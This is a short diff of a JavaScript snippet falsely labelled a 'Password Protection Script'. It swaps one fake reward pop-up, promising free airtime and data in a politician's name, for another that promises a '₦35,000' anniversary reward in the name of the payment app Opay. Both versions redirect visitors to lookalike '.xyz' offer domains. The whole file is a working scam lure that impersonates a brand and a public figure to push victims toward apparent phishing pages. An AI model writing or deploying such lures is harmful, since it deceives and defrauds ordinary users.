@@ -1,6 +1,7 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = '₦35,000'
+password=prompt('SMS: Congratulations Your opay Account is Eligible to receive ₦35,000 opay Anniversary Reward, Kindly Press OK to PROCEED ','₦35,000');
+if (password != '₦35,000') {
+location.href='https://opay.offer-it.xyz/Gift';
+
 }
